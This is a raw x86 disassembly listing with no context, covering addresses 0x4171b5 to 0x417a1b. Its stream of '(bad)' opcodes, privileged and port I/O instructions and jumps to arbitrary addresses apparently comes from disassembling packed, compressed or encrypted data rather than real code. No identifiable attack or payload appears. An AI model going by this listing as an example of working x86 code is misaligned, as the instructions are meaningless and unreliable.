  4171b5:	sub    al,0x14
  4171b7:	or     edx,DWORD PTR [edx+eax*4-0x4]
  4171bb:	mov    ecx,0x2f852f
  4171c0:	popf   
  4171c1:	jp     0x4171af
  4171c3:	stos   BYTE PTR es:[edi],al
  4171c4:	sub    al,0x7a
  4171c6:	mov    ebx,0xb3ac25de
  4171cb:	pushf  
  4171cc:	xor    DWORD PTR [ebp-0x127d15c8],ecx
  4171d2:	jo     0x4171b2
  4171d4:	fimul  WORD PTR [ebx+0x6b33da1]
  4171da:	push   ebp
  4171db:	xchg   BYTE PTR [ecx-0x25],ah
  4171de:	loopne 0x41717e
  4171e0:	mov    esp,0xd2b1edc3
  4171e5:	xchg   edx,eax
  4171e6:	ss pop es
  4171e8:	sub    eax,0x57326692
  4171ed:	add    BYTE PTR [edx+0xe],0x3c
  4171f1:	iret   
  4171f2:	clc    
  4171f3:	dec    ecx
  4171f4:	mov    dl,0xaf
  4171f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171f7:	dec    ebx
  4171f8:	and    al,0x49
  4171fa:	pop    ds
  4171fb:	xchg   esp,eax
  4171fc:	dec    ecx
  4171fd:	das    
  4171fe:	bound  edx,QWORD PTR [esi]
  417200:	int    0x72
  417202:	pop    ds
  417203:	test   eax,0xdacee341
  417208:	lock xchg ebp,eax
  41720a:	dec    eax
  41720b:	push   ebx
  41720c:	xchg   ecx,eax
  41720d:	stos   BYTE PTR es:[edi],al
  41720e:	outs   dx,DWORD PTR ds:[esi]
  41720f:	sub    DWORD PTR [edi+0x5c],0xe1d69285
  417216:	test   BYTE PTR [edi],dh
  417218:	adc    dl,BYTE PTR [ebp-0x493c3fd7]
  41721e:	dec    esi
  41721f:	xor    BYTE PTR [eax+edx*2+0x62],0xb2
  417224:	lea    ebp,[ecx+0x7458875b]
  41722a:	push   esp
  41722b:	mov    WORD PTR [eax-0x7f2bf3a7],?
  417231:	gs loop 0x4171bf
  417234:	jecxz  0x41729b
  417236:	fild   WORD PTR [edx+0x58]
  417239:	stos   DWORD PTR es:[edi],eax
  41723a:	pop    eax
  41723b:	fisub  WORD PTR [eax]
  41723d:	xchg   edi,eax
  41723e:	cmp    ecx,DWORD PTR [edx]
  417240:	pop    edx
  417241:	loopne 0x4172bd
  417243:	xor    eax,0x5b86d55f
  417248:	jge    0x41729e
  41724a:	cs cmovs ebp,edx
  41724e:	mov    ecx,?
  417250:	pextrw esp,(bad),0xc5
  417252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417253:	push   ss
  417254:	xor    al,0xfe
  417256:	dec    edx
  417257:	sbb    esp,ebx
  417259:	push   ebx
  41725a:	mov    edx,0xdef280c4
  41725f:	cwde   
  417260:	sbb    eax,0x46883e54
  417265:	sub    al,al
  417267:	fld    QWORD PTR [edi+eiz*1-0x48a3fcbe]
  41726e:	aad    0x64
  417270:	jle    0x417274
  417272:	mov    ds:0x4d77034f,al
  417277:	sbb    al,ch
  417279:	in     eax,0x54
  41727b:	(bad)  
  41727c:	push   ebp
  41727d:	jecxz  0x4172d5
  41727f:	xor    al,0x32
  417281:	add    BYTE PTR [edi+ebx*2-0xb7d6b96],dl
  417288:	mov    DWORD PTR [edi],ebp
  41728a:	mov    edx,?
  41728c:	pop    ebp
  41728d:	leave  
  41728e:	or     esi,DWORD PTR [esi+edi*1-0x49]
  417292:	stos   DWORD PTR es:[edi],eax
  417293:	cs popf 
  417295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417296:	das    
  417297:	jl     0x417313
  417299:	hlt    
  41729a:	ja     0x417283
  41729c:	outs   dx,DWORD PTR ds:[esi]
  41729d:	in     al,dx
  41729e:	adc    eax,0xb741dd86
  4172a3:	jno    0x417244
  4172a5:	inc    ecx
  4172a6:	repz jle 0x41731f
  4172a9:	nop
  4172aa:	mov    ds:0xa527df86,al
  4172af:	inc    esi
  4172b0:	xchg   ecx,eax
  4172b1:	and    DWORD PTR [esi-0x53e5b227],0xffffff90
  4172b8:	rcr    bl,1
  4172ba:	and    bl,ah
  4172bc:	xlat   BYTE PTR ds:[ebx]
  4172bd:	inc    edi
  4172be:	in     eax,0xf9
  4172c0:	xlat   BYTE PTR ds:[ebx]
  4172c1:	xor    DWORD PTR [edx],eax
  4172c3:	data16 (bad) 
  4172c6:	mov    ebx,0xf01d5642
  4172cb:	pop    ss
  4172cc:	fbld   TBYTE PTR [ebp+0x4f961e1d]
  4172d2:	pusha  
  4172d3:	js     0x417350
  4172d5:	inc    ecx
  4172d6:	test   BYTE PTR [bx+di],ch
  4172d9:	xchg   edx,eax
  4172da:	ret    
  4172db:	inc    edi
  4172dc:	lahf   
  4172dd:	xchg   edx,eax
  4172de:	sub    bh,BYTE PTR [ecx]
  4172e0:	xor    DWORD PTR [esi-0x75],ebx
  4172e3:	iret   
  4172e4:	dec    eax
  4172e5:	xor    al,BYTE PTR [edi-0x1b]
  4172e8:	sbb    eax,0x5649a8c3
  4172ed:	popa   
  4172ee:	test   DWORD PTR [edi],edx
  4172f0:	aas    
  4172f1:	jne    0x417321
  4172f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172f4:	aad    0x6f
  4172f6:	test   al,0x8f
  4172f8:	fld    DWORD PTR [edx-0x5f85748e]
  4172fe:	xor    al,0x67
  417300:	test   BYTE PTR [edx-0x4b1bd3d2],ah
  417306:	nop
  417307:	ficom  DWORD PTR [eax]
  417309:	sub    BYTE PTR [ecx],dl
  41730b:	mov    WORD PTR [esi],ss
  41730d:	int    0x88
  41730f:	(bad)
  417312:	scas   eax,DWORD PTR es:[edi]
  417313:	add    eax,0xfdb9353
  417318:	addr16 add eax,0xea405a27
  41731e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417320:	fmul   DWORD PTR [bx+di+0x2a]
  417324:	int    0xc6
  417326:	or     DWORD PTR [edx],0xffffffbc
  417329:	jbe    0x4172c7
  41732b:	push   ss
  41732c:	dec    ebp
  41732d:	mov    dh,0xb0
  41732f:	loope  0x417360
  417331:	(bad)  
  417332:	add    eax,0x1355335
  417337:	scas   eax,DWORD PTR es:[edi]
  417338:	mov    ds:0x2817889d,al
  41733d:	and    eax,0xf73fa76d
  417342:	sbb    DWORD PTR [eax],esp
  417344:	pushf  
  417345:	ins    BYTE PTR es:[edi],dx
  417346:	pusha  
  417347:	bound  ebp,QWORD PTR [ebp-0x37dd8e2d]
  41734d:	add    ecx,edi
  41734f:	xchg   BYTE PTR [edi+eiz*8],dh
  417352:	dec    edx
  417353:	out    dx,al
  417354:	or     BYTE PTR [esi-0x7d],cl
  417357:	sub    bl,BYTE PTR [ebx+eiz*1]
  41735a:	test   eax,0xc14db22b
  41735f:	inc    esp
  417361:	sbb    ah,BYTE PTR [esi-0x45be001b]
  417367:	je     0x417349
  417369:	push   edx
  41736a:	mov    ebp,0x96b8a037
  41736f:	xchg   dl,bh
  417371:	jecxz  0x41730b
  417373:	cwde   
  417374:	in     al,0x16
  417376:	push   0xfffffffe
  417378:	retf   0x409e
  41737b:	jbe    0x4173c7
  41737d:	out    0x80,al
  41737f:	leave  
  417380:	push   es
  417381:	pop    ss
  417382:	scas   al,BYTE PTR es:[edi]
  417383:	inc    esp
  417384:	mov    ebx,0xa07bbd6b
  417389:	inc    edi
  41738a:	jae    0x4173cb
  41738c:	xor    BYTE PTR [esi+0x2fd2a966],dl
  417392:	sub    edi,esi
  417394:	mov    ch,0x83
  417396:	pop    eax
  417397:	iret   
  417398:	icebp  
  417399:	loop   0x41731e
  41739b:	sar    DWORD PTR [edi],1
  41739d:	into   
  41739e:	mov    ds:0x4985967a,eax
  4173a3:	fist   WORD PTR [eax-0x75]
  4173a6:	sub    DWORD PTR [ebx],edi
  4173a8:	lds    esp,FWORD PTR ds:0xd6643449
  4173ae:	cmp    BYTE PTR [edi+edi*1],dl
  4173b1:	push   eax
  4173b2:	add    cl,BYTE PTR [esi+0x7c]
  4173b5:	cdq    
  4173b6:	cli    
  4173b7:	mov    ebx,0x9d8e7d16
  4173bc:	rcr    BYTE PTR [edx+0x3323acf1],0xbc
  4173c3:	and    al,BYTE PTR [edx]
  4173c5:	ss (bad) 
  4173c7:	fst    QWORD PTR [esi]
  4173c9:	mov    ebp,0xe90405d6
  4173ce:	pop    ebp
  4173cf:	push   es
  4173d0:	mov    ebp,0xb7551ccc
  4173d5:	jae    0x4173dc
  4173d7:	je     0x41743b
  4173d9:	xor    al,0xb8
  4173db:	jmp    0x77fd5052
  4173e0:	aas    
  4173e1:	xor    cl,ah
  4173e3:	test   BYTE PTR [ecx+eax*1],dh
  4173e6:	add    BYTE PTR [ebx+0x953683d],al
  4173ec:	add    eax,0xcfeadd92
  4173f1:	pop    esp
  4173f2:	mov    esp,0x847b6f8b
  4173f7:	xchg   DWORD PTR [ebx+0x3e0c5364],ecx
  4173fd:	sub    ch,BYTE PTR [ebp-0x3b]
  417400:	xchg   esp,eax
  417401:	clc    
  417402:	dec    ebx
  417403:	jp     0x4173db
  417405:	lods   al,BYTE PTR ds:[esi]
  417406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417407:	mov    edx,0x3ce43792
  41740c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41740d:	out    0x92,al
  41740f:	xlat   BYTE PTR ds:[ebx]
  417410:	cdq    
  417411:	xor    al,0x6
  417413:	sub    eax,0xfc33af0a
  417418:	dec    edi
  417419:	jbe    0x4173fb
  41741b:	pop    es
  41741c:	adc    DWORD PTR [ebx-0x7738f4e7],edx
  417422:	mov    dh,0xb2
  417424:	mov    ch,cl
  417426:	call   ebp
  417428:	je     0x417484
  41742a:	imul   esi,DWORD PTR [ebx+0x3b581f4],0xffffff9c
  417431:	xchg   ebx,eax
  417432:	stos   BYTE PTR es:[edi],al
  417433:	mov    eax,0x7c6ef427
  417438:	push   ss
  417439:	mov    dh,al
  41743b:	inc    esi
  41743c:	xchg   edx,eax
  41743d:	adc    edx,edx
  41743f:	cmp    dl,BYTE PTR [eax+0x9d07563]
  417445:	xchg   edi,eax
  417446:	cmp    DWORD PTR [edi],esp
  417448:	xchg   edi,eax
  417449:	sti    
  41744a:	aas    
  41744b:	outs   dx,BYTE PTR ds:[esi]
  41744c:	out    0xd5,al
  41744e:	push   ebx
  41744f:	lods   al,BYTE PTR ds:[esi]
  417450:	sti    
  417451:	dec    edx
  417452:	jbe    0x41747d
  417454:	pop    esi
  417455:	mov    ebx,0x818ce8ec
  41745a:	cmp    ebx,ebp
  41745c:	inc    ecx
  41745d:	fist   WORD PTR [edi]
  41745f:	lock out dx,al
  417461:	push   ss
  417462:	mov    esp,0xcbe5ec75
  417467:	cmp    BYTE PTR [edi+ecx*4-0x644135ab],ah
  41746e:	mul    BYTE PTR [eax-0x4ecf8]
  417474:	xor    eax,0x32740b43
  417479:	(bad)  
  41747a:	mov    al,ds:0x1c03fd45
  41747f:	adc    al,BYTE PTR [edx]
  417481:	and    ch,bh
  417483:	ret    0xc85
  417486:	jp     0x417507
  417488:	mov    bl,0x6a
  41748a:	aaa    
  41748b:	cmp    cl,bh
  41748d:	mov    esp,0xeca42abd
  417492:	sbb    dl,0x45
  417495:	into   
  417496:	xchg   esp,eax
  417497:	pop    es
  417498:	and    BYTE PTR [ecx],dh
	...
  417512:	add    BYTE PTR [eax],al
  417514:	aad    0x80
  417516:	pusha  
  417517:	cld    
  417518:	jne    0x417516
  41751a:	(bad)  [ecx+0x32bc8e94]
  417520:	test   DWORD PTR [ebx-0x5],esp
  417523:	in     al,dx
  417524:	test   DWORD PTR [eax],ebx
  417526:	add    DWORD PTR [eax],eax
  417528:	outs   dx,BYTE PTR ds:[esi]
  417529:	pop    es
  41752a:	add    BYTE PTR [eax],al
  41752c:	push   edx
  41752d:	mov    eax,0xd13887ff
  417532:	cmp    esp,edx
  417534:	popa   
  417535:	iret   
  417536:	cmp    BYTE PTR [edi],bh
  417538:	push   ebp
  417539:	sub    DWORD PTR [ebx-0x21],ecx
  41753c:	push   ds
  41753d:	mov    bl,0x7c
  41753f:	in     al,0xb7
  417541:	jecxz  0x4174e9
  417543:	sbb    edi,DWORD PTR [edx+0x3b]
  417546:	or     bl,bh
  417548:	mov    ebx,0x81653e63
  41754d:	sahf   
  41754e:	dec    esp
  41754f:	(bad)  
  417551:	xchg   esp,eax
  417552:	push   esi
  417553:	fild   WORD PTR [ebp+0x7f]
  417556:	sbb    ebp,DWORD PTR [ebx-0x29544ab8]
  41755c:	push   ss
  41755d:	dec    ecx
  41755e:	pop    ebx
  417560:	imul   esi,DWORD PTR [edx-0x4b],0x8208f3e4
  417567:	or     DWORD PTR [edi-0x63],0x60
  41756b:	jo     0x417521
  41756d:	ins    DWORD PTR es:[edi],dx
  41756e:	cli    
  41756f:	data16 adc ah,BYTE PTR [edi+0x1e]
  417573:	pushf  
  417574:	or     ah,ch
  417576:	push   esp
  417577:	mov    al,0x55
  417579:	mov    eax,0xfc8ebf0d
  41757e:	push   edi
  41757f:	retf   0x4e65
  417582:	mov    dl,0xb9
  417584:	jbe    0x4175aa
  417586:	sub    DWORD PTR [ebx-0x6e59137b],esi
  41758c:	mov    al,ds:0x669b3445
  417591:	outs   dx,BYTE PTR ds:[esi]
  417592:	jle    0x417514
  417594:	pop    ss
  417595:	pop    ds
  417596:	mov    esi,esp
  417598:	ins    DWORD PTR es:[edi],dx
  417599:	adc    DWORD PTR [ebx-0x136da247],edi
  41759f:	jae    0x417567
  4175a1:	cwde   
  4175a2:	(bad)  
  4175a3:	mov    edx,ebx
  4175a5:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4175a7:	ss mov bh,0x3
  4175aa:	test   al,0x50
  4175ac:	(bad)  
  4175ad:	and    al,0x1e
  4175af:	icebp  
  4175b0:	(bad)  
  4175b1:	jae    0x417542
  4175b3:	xchg   ecx,eax
  4175b4:	retf   
  4175b5:	push   edi
  4175b6:	fcom   DWORD PTR [edi-0x5c9ccb44]
  4175bc:	add    eax,0x1c0e170b
  4175c1:	iret   
  4175c2:	cmp    DWORD PTR [ecx+edi*2+0xa],0x25a9ba4b
  4175ca:	lahf   
  4175cb:	cmp    edi,ecx
  4175cd:	dec    edx
  4175ce:	(bad)  
  4175cf:	imul   ecx,DWORD PTR [eax+0xdd167f3],0xfffffff9
  4175d6:	push   ebx
  4175d7:	dec    ecx
  4175d8:	(bad)  
  4175da:	in     eax,0xf
  4175dc:	rol    BYTE PTR [ebx],0x30
  4175df:	arpl   WORD PTR [edi+0x3744dd96],ax
  4175e5:	in     eax,dx
  4175e6:	sub    eax,0x62a71b09
  4175eb:	das    
  4175ec:	add    DWORD PTR [eax+0xdee67e2],ebp
  4175f2:	push   esp
  4175f3:	cli    
  4175f4:	ins    DWORD PTR es:[edi],dx
  4175f5:	(bad)  [ebp-0x36]
  4175f8:	mov    eax,ds:0x445e504e
  4175fd:	mov    ecx,0x2c42d23f
  417602:	pavgb  mm0,mm4
  417605:	mov    edx,0xd766e565
  41760a:	push   edi
  41760b:	mov    edi,DWORD PTR [edi+0x795ff94]
  417611:	mov    bh,0x77
  417613:	dec    ebx
  417614:	clc    
  417615:	or     eax,0x42a35e21
  41761a:	retf   
  41761b:	out    0x1b,al
  41761d:	fcomp  DWORD PTR [esi-0x1738b8dc]
  417623:	mov    ah,0xc3
  417625:	mov    bl,0x27
  417627:	(bad)  
  417628:	xchg   ecx,eax
  417629:	sbb    al,0x33
  41762b:	int    0xc4
  41762d:	mov    esi,?
  41762f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417630:	cld    
  417631:	sub    eax,DWORD PTR [ebp-0x60]
  417634:	cld    
  417635:	imul   ecx,DWORD PTR [ebx-0x14f9fdda],0x54
  41763c:	mov    cl,0x88
  41763e:	dec    ebp
  41763f:	xchg   esi,eax
  417640:	push   0xe028dcda
  417645:	xor    BYTE PTR [edx-0x33],bh
  417648:	push   edx
  417649:	adc    DWORD PTR [ecx+0x6b],esi
  41764c:	loope  0x4175d6
  41764e:	(bad)  
  41764f:	sbb    cl,BYTE PTR [edx+ecx*4]
  417652:	xor    BYTE PTR [edi+0x2b838213],ch
  417658:	dec    ebx
  417659:	fstp   DWORD PTR [edx]
  41765b:	adc    BYTE PTR [edx],dl
  41765d:	mov    ds:0x44b2cf31,al
  417662:	outs   dx,DWORD PTR ds:[esi]
  417663:	cmp    esi,eax
  417665:	rcr    DWORD PTR [ebx-0x4cbf4d6],1
  41766b:	adc    DWORD PTR [ebx+0x44830149],0x3a43112a
  417675:	cmc    
  417676:	push   edi
  417677:	lock into 
  417679:	mov    ds:0x6ce01446,eax
  41767e:	xor    esi,edx
  417680:	test   eax,0x73aa28c3
  417685:	pop    esi
  417686:	xor    edx,eax
  417688:	clc    
  417689:	dec    edi
  41768a:	or     BYTE PTR [eax+0x200cbf48],dh
  417690:	sub    al,0x8c
  417692:	aam    0x2c
  417694:	shl    DWORD PTR [edx+0x17b9efea],0x69
  41769b:	pop    es
  41769c:	pop    es
  41769d:	xchg   DWORD PTR [ebp+0x57],ecx
  4176a0:	les    ebx,FWORD PTR [edi+0x25]
  4176a3:	fidivr DWORD PTR [edi+0x72]
  4176a6:	enter  0xaac6,0x53
  4176aa:	mov    eax,ds:0xbcc47e17
  4176af:	sti    
  4176b0:	jge    0x417670
  4176b2:	jns    0x4176a8
  4176b4:	popf   
  4176b5:	arpl   WORD PTR [ecx-0x3789a789],ax
  4176bb:	loop   0x41771d
  4176bd:	ja     0x4176a0
  4176bf:	mov    ebx,ecx
  4176c1:	ins    BYTE PTR es:[edi],dx
  4176c2:	mov    ch,0xfd
  4176c4:	lods   al,BYTE PTR ds:[esi]
  4176c5:	cs pop ebp
  4176c7:	and    DWORD PTR [edi],esi
  4176c9:	out    dx,al
  4176ca:	xor    BYTE PTR [ebx],dh
  4176cc:	data16 mov bh,0x7f
  4176cf:	into   
  4176d0:	push   eax
  4176d1:	dec    esp
  4176d2:	sti    
  4176d3:	les    edx,FWORD PTR [eax-0x4b17ce2e]
  4176d9:	retf   
  4176da:	inc    ecx
  4176db:	cld    
  4176dc:	ret    0x85ae
  4176df:	mov    eax,0xeac7f1f8
  4176e4:	enter  0x7e5e,0x19
  4176e8:	inc    ecx
  4176e9:	imul   esp,eax,0x301e6acb
  4176ef:	push   esp
  4176f0:	jmp    0x6ea8:0xde772e15
  4176f7:	add    al,0x7f
  4176f9:	and    al,0x8f
  4176fb:	xchg   BYTE PTR [esi-0x34],ch
  4176fe:	(bad)  
  417700:	push   0xe5be41d0
  417705:	clc    
  417706:	repnz or eax,0x3b778083
  41770c:	jno    0x417728
  41770e:	cmp    cl,dl
  417710:	dec    eax
  417711:	mov    bl,0x74
  417713:	aam    0x13
  417715:	inc    esp
  417716:	imul   ecx,DWORD PTR [ecx+0x1daa05bc],0x8
  41771d:	jmp    0x4176da
  41771f:	mov    ds:0xd0fce88c,al
  417724:	test   DWORD PTR ds:0xd68b658c,ebx
  41772a:	dec    edi
  41772b:	out    0x72,eax
  41772d:	cmp    ecx,DWORD PTR [ecx]
  41772f:	repz ficomp WORD PTR [edi-0x23]
  417733:	and    al,0xfb
  417735:	pop    ebp
  417736:	je     0x417792
  417738:	cdq    
  417739:	push   edi
  41773a:	test   DWORD PTR [esi+eiz*1-0xa],ebx
  41773e:	in     al,dx
  41773f:	pop    eax
  417740:	in     eax,0x6f
  417742:	pusha  
  417743:	xor    bh,BYTE PTR [eax+0x45]
  417746:	arpl   bp,di
  417748:	call   0x9e156b6f
  41774d:	adc    al,0x98
  41774f:	pop    eax
  417750:	sub    eax,0x8c82df17
  417755:	push   esi
  417756:	push   ebp
  417757:	mov    al,0x75
  417759:	adc    BYTE PTR [ebx],ah
  41775b:	es cdq 
  41775d:	lds    ecx,FWORD PTR [eax+0x3c]
  417760:	pop    ebx
  417762:	pop    esp
  417763:	or     eax,0xabf19a70
  417768:	retf   0x8477
  41776b:	gs in  eax,dx
  41776d:	popa   
  41776e:	ret    
  41776f:	xor    ah,BYTE PTR [eax+0x321007b0]
  417775:	mov    ch,0x1c
  417777:	push   esp
  417778:	sbb    eax,0x15adb2ec
  41777d:	sbb    dh,bh
  41777f:	push   ebp
  417780:	add    al,0x33
  417782:	pop    esp
  417783:	cwde   
  417784:	jmp    0x41773f
  417786:	sub    al,0x1e
  417788:	push   esi
  417789:	mov    dh,0xe0
  41778b:	sub    DWORD PTR [esi-0x21806d9d],ebp
  417791:	in     eax,dx
  417792:	sub    ebp,DWORD PTR ss:[edx]
  417795:	or     eax,DWORD PTR [esi+0x23f8cb0e]
  41779b:	(bad)  
  41779c:	repz push esp
  41779e:	fisttp QWORD PTR [esi-0x2069b005]
  4177a4:	test   al,0x6a
  4177a6:	xchg   BYTE PTR [ebp+0x38301d16],bl
  4177ac:	test   al,0x81
  4177ae:	sbb    al,0xba
  4177b0:	leave  
  4177b1:	mov    ebx,0xa1fceffd
  4177b6:	push   edi
  4177b7:	or     al,0xc8
  4177b9:	imul   esi,DWORD PTR [edi-0x51f417ec],0x13dcc0be
  4177c3:	xchg   ebp,eax
  4177c4:	mov    ds:0x1ff693a7,eax
  4177c9:	dec    esp
  4177ca:	mov    bh,0xbd
  4177cc:	dec    ecx
  4177cd:	pop    edx
  4177ce:	sub    al,BYTE PTR [eax]
  4177d0:	call   0x7ac70375
  4177d5:	arpl   WORD PTR [esi],dx
  4177d7:	mov    bh,0x33
  4177d9:	je     0x41777d
  4177db:	push   ebp
  4177dc:	sub    bh,ch
  4177de:	push   0x56c983ce
  4177e3:	xchg   edi,eax
  4177e4:	ret    0xaace
  4177e7:	shr    edx,1
  4177e9:	ror    bh,0x7
  4177ec:	mov    ds:0xedb9cc2,eax
  4177f1:	repz sbb ebp,edx
  4177f4:	mov    ah,0x59
  4177f6:	jb     0x41782f
  4177f8:	iret   
  4177f9:	shr    esi,1
  4177fb:	or     eax,0xc2610137
  417800:	mov    bl,bl
  417802:	dec    eax
  417803:	xchg   edx,esp
  417805:	js     0x417802
  417807:	mov    ecx,0xf1c10802
  41780c:	sar    cl,cl
  41780e:	(bad)  
  41780f:	aas    
  417810:	cwde   
  417811:	popa   
  417812:	adc    al,cl
  417814:	dec    ebx
  417816:	hlt    
  417817:	push   eax
  417818:	dec    edi
  417819:	jae    0x4177f1
  41781b:	jne    0x417802
  41781d:	dec    ebp
  41781e:	in     al,0x34
  417820:	mov    cl,0x1e
  417822:	rcr    DWORD PTR [edx+0x1bd24d90],0xf8
  417829:	repz in al,dx
  41782b:	or     DWORD PTR [ecx-0x6b],ebx
  41782e:	scas   al,BYTE PTR es:[edi]
  41782f:	push   edx
  417830:	stc    
  417831:	in     eax,0x38
  417833:	push   ebp
  417834:	je     0x4178a1
  417836:	je     0x417882
  417838:	dec    eax
  417839:	xor    al,0xed
  41783b:	into   
  41783c:	cmp    al,0xce
  41783e:	ds pop cx
  417841:	jmp    0x4177c3
  417843:	jnp    0x4178ad
  417845:	iret   
  417846:	sbb    edx,ecx
  417848:	call   0xec7d7009
  41784d:	dec    ebp
  41784e:	in     al,dx
  41784f:	dec    edi
  417850:	(bad)  
  417851:	cs rol ah,cl
  417854:	mov    al,0xbe
  417856:	push   esi
  417857:	add    BYTE PTR [eax+0x21],ch
  41785a:	cmc    
  41785b:	in     eax,dx
  41785c:	inc    ebp
  41785d:	and    BYTE PTR [ebx+ebp*1-0x630acf1c],ch
  417864:	call   0x67a:0xa7c8a929
  41786b:	fldcw  WORD PTR [edx]
  41786d:	xchg   ebx,eax
  41786e:	mov    bh,0xfa
  417870:	pop    es
  417871:	popa   
  417872:	dec    ecx
  417873:	xor    esp,DWORD PTR ds:0x33a8d759
  417879:	and    bl,BYTE PTR [esp+eax*1]
  41787c:	in     al,0xf2
  41787e:	dec    eax
  41787f:	mov    BYTE PTR [eax],bh
  417881:	dec    esp
  417882:	mov    al,0x4c
  417884:	int    0xc0
  417886:	push   ss
  417887:	xchg   ebp,eax
  417888:	scas   al,BYTE PTR es:[edi]
  417889:	or     BYTE PTR [esi-0x5b73dabe],cl
  41788f:	or     DWORD PTR [edi-0x3b],0x3219b83f
  417896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417897:	aas    
  417898:	hlt    
  417899:	daa    
  41789a:	loopne 0x4178f0
  41789c:	add    dh,BYTE PTR [esi+0x4f78048a]
  4178a2:	cmovbe eax,DWORD PTR [ecx-0x66]
  4178a6:	arpl   WORD PTR [edi+0x150810cb],ax
  4178ac:	lods   eax,DWORD PTR ds:[esi]
  4178ad:	dec    esi
  4178ae:	cmp    ch,BYTE PTR [edi]
  4178b0:	mov    BYTE PTR [edi-0x25],cl
  4178b3:	inc    ecx
  4178b4:	call   0x7f70:0xc0f21fab
  4178bb:	inc    ebp
  4178bc:	sub    BYTE PTR [ecx+ecx*4+0x20ba3824],dh
  4178c3:	jns    0x417923
  4178c5:	mov    ah,0x64
  4178c7:	out    dx,al
  4178c8:	sahf   
  4178c9:	mov    ah,dh
  4178cb:	ret    0xeb55
  4178ce:	int3   
  4178cf:	and    ebx,DWORD PTR [esp+edi*4-0xc]
  4178d3:	or     ebx,DWORD PTR [bx+di-0x2af9]
  4178d8:	mov    bl,0x8e
  4178da:	or     al,0x44
  4178dc:	xor    ebp,DWORD PTR ds:0x5bb8b5f9
  4178e2:	ja     0x417928
  4178e4:	sti    
  4178e5:	test   eax,0xe8a5bff9
  4178ea:	enter  0xf369,0xf3
  4178ee:	mov    ah,BYTE PTR [eax+edx*4+0x50cebc32]
  4178f5:	or     ah,dl
  4178f7:	es push edi
  4178f9:	dec    esp
  4178fa:	lahf   
  4178fb:	jne    0x4178db
  4178fd:	pop    edi
  4178fe:	add    edi,DWORD PTR [edi+0x2f]
  417901:	bound  edi,QWORD PTR [esp]
  417904:	push   edi
  417905:	mov    eax,0xcc9d1e71
  41790a:	dec    eax
  41790b:	push   edx
  41790c:	sub    BYTE PTR [ebx+0x49],0x9c
  417910:	lock cmp al,0x34
  417913:	cmp    ch,BYTE PTR [ecx+0x5c]
  417916:	ret    
  417917:	sbb    edx,DWORD PTR [eax-0x568eff88]
  41791d:	cld    
  41791e:	(bad)
  417922:	add    dl,BYTE PTR [edi+0x60]
  417925:	or     al,BYTE PTR [ecx+0x728ed21c]
  41792b:	sub    eax,0x4da41edb
  417930:	cdq    
  417931:	bound  edi,QWORD PTR [eax+edi*1]
  417934:	pop    ebp
  417935:	loopne 0x41795a
  417937:	stc    
  417938:	jmp    0x7269bea0
  41793d:	push   eax
  41793e:	loopne 0x417963
  417940:	or     bh,dl
  417942:	int3   
  417943:	(bad)  
  417944:	fimul  DWORD PTR [edi-0x4456a95]
  41794a:	mov    ebx,0xf40554d9
  41794f:	daa    
  417950:	jl     0x4179ad
  417952:	daa    
  417953:	gs inc eax
  417955:	lods   al,BYTE PTR ds:[esi]
  417956:	nop
  417957:	push   ds
  417958:	cmp    DWORD PTR [ecx-0x42],esp
  41795b:	add    edi,esp
  41795d:	xchg   ebx,eax
  41795e:	cli    
  41795f:	call   0x3bef239a
  417964:	jmp    0x41796e
  417966:	mov    ds:0x936f2795,al
  41796b:	icebp  
  41796c:	sbb    al,0xaa
  41796e:	cmp    eax,0xa1437b39
  417973:	ret    
  417974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417975:	or     esp,edx
  417977:	test   al,0x1d
  417979:	mov    dh,0xe3
  41797b:	mov    al,0x3c
  41797d:	xor    BYTE PTR [esi],dl
  41797f:	sbb    eax,0xf6e0cb8b
  417984:	pop    ss
  417985:	cmp    cl,ah
  417987:	push   esp
  417988:	pop    esp
  417989:	push   edi
  41798a:	jmp    0x162f18ab
  41798f:	call   0x70b196f1
  417994:	stc    
  417995:	mov    edi,DWORD PTR [ebx-0x80]
  417998:	push   esp
  417999:	lods   eax,DWORD PTR ds:[esi]
  41799a:	in     eax,0xc8
  41799c:	das    
  41799d:	inc    ebx
  41799e:	shl    ecx,1
  4179a0:	imul   DWORD PTR [edi-0x5783035f]
  4179a6:	push   es
  4179a7:	ja     0x417966
  4179a9:	scas   al,BYTE PTR es:[edi]
  4179aa:	sbb    esi,DWORD PTR [ebx+0x48]
  4179ad:	and    al,ah
  4179af:	shr    DWORD PTR [ebp+0x5a],0x44
  4179b3:	stos   BYTE PTR es:[edi],al
  4179b4:	leave  
  4179b5:	test   al,0xc6
  4179b7:	es jnp 0x417989
  4179ba:	adc    BYTE PTR [ecx-0x413895ca],ch
  4179c0:	dec    esp
  4179c1:	(bad)  
  4179c3:	das    
  4179c4:	jmp    0x8e75:0x7badd4d4
  4179cb:	stos   BYTE PTR es:[edi],al
  4179cc:	fisub  WORD PTR [eax-0x71faa442]
  4179d2:	or     eax,0x46821d3f
  4179d7:	inc    esi
  4179d8:	cli    
  4179d9:	dec    eax
  4179da:	ror    DWORD PTR [ebx-0x38c188de],1
  4179e0:	js     0x417998
  4179e2:	ret    0x4910
  4179e5:	pop    ss
  4179e6:	dec    eax
  4179e7:	xchg   ebp,eax
  4179e8:	nop
  4179e9:	int    0x58
  4179eb:	jno    0x4179f8
  4179ed:	and    ebp,eax
  4179ef:	adc    BYTE PTR [eax],ah
  4179f1:	add    al,BYTE PTR [ebp+0x51]
  4179f4:	sar    DWORD PTR [edi],1
  4179f6:	push   0x38
  4179f8:	mov    esp,0x8aa14006
  4179fd:	mov    edx,0x16668372
  417a02:	jmp    0x861641c9
  417a07:	inc    edi
  417a08:	mov    bx,0xd62
  417a0c:	cmp    DWORD PTR [ecx-0x10],ecx
  417a0f:	xchg   ebp,eax
  417a10:	fdivr  QWORD PTR [esi]
  417a12:	jl     0x4179b4
  417a14:	mov    ds:0x4b62c463,al
  417a19:	jp     0x417a95
  417a1b:	aad    0x8d
